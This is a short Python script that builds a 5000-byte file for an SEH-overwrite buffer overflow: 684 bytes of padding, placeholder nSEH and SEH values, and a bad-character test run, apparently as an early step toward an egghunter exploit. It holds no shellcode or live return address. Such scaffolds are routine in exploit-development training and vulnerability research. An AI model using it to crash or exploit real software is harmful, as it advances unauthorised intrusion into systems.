#!/usr/bin/python

file2="egghpayload.txt"

badchars = (
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
)

nSEH = "B" * 4
SEH  = "C" * 4

egghpayload  = "A" * 684
egghpayload += nSEH
egghpayload += SEH
egghpayload += badchars
egghpayload += "D" * (5000 - len(egghpayload))


textfile = open(file2 , 'w')
textfile.write(egghpayload)
textfile.close()

